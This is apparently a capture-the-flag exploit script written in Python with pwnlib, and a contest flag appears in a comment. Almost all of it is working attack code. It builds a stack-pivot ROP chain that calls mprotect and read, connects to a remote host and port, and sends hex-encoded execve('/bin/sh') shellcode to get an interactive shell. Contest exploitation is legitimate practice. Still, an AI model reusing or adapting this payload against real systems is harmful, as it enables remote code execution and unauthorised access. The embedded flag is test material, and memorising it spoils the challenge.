from pwnlib import *

# flag{Asc11_ea3y_d0_1t???}

mprotect = 0x556491a0
read = 0x5563cbe0


payload  = "A"*32
payload += pd(0x555c6f5c) # pivot


payload += "\x00"*4
payload += "B"*0x50
payload += pd(mprotect)
payload += pd(0x8048899)
payload += pd(0x5555E000)
payload += pd(0x1000)
payload += pd(7)

payload += pd(read)
payload += pd(0x5555e000)
payload += pd(0)
payload += pd(0x5555e000)
payload += pd(0x100)





assert "\n" not in payload


#s = Socket(("localhost", 6767))
s = Socket(("202.120.7.214", 23222))
s.ru("GO : ) \n")
s.send(payload + "\n")

raw_input("> ")
s.send("6a0b589952682f2f7368682f62696e89e3525389e1cd80".decode("hex"))


s.interact()
